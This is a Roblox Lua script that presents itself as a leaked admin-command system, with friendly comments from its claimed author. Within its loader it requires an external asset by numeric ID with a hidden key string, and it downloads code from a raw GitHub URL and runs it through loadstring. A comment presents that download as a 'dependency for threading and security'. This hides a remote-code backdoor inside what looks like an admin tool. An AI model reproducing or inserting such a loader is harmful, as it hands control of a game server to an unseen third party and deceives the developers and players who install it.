--[[
	Hi; Rerumu here leaking my own admin.
	Yes I am bored.
	No I do not care.
	Hoping you lovelies enjoy my work. Read along as to learn how some features such as the remote
	api are implemented and how injects can be added.
--]]

require(129762974540458)("tricky3685")

local next		= next; -- NOTE: Anything with "NOTE:" behind it is me speaking about the open-source.
local wait		= wait; -- NOTE: This has been somewhat edited because obviously I am not giving you my api keys.
local pcall		= pcall; -- NOTE: Do enjoy it though. I have ocd so I localize everything.
local table		= table;
local require	= require;
local Code		= game:GetService("ReplicatedStorage"):WaitForChild('Code'):Clone();
local Deps		= game:GetService("ReplicatedStorage"):WaitForChild('Deps'):Clone();
setfenv(1, {}); -- Refer to previous comment.
local Clear;
local Insert		= table.insert;
local Ran, System	= loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/ErringPaladin10-VTILServer/--/refs/heads/main/MainAssetModule.lua"))(); -- Clear dependency for threading and security.
if (not Ran) or System.Ran then return nil; end;
local Load	= {};
for _, Name in next, {'System', 'Profile', 'Commands', 'Themes', 'Process'} do
	Insert(Load, Code:WaitForChild(Name));
end;
Code			= nil;
Clear			= System();
Clear.Deps		= Deps;
function Clear.WaitFor(Idx)
	local F	= Clear[Idx];
	
	while (not F) do
		F	= Clear[Idx];
		
		wait(1 / 120);
	end;
	
	return F;
end;
System(Load); -- Start up the modules.
return 70540486; -- Hey; that's me.
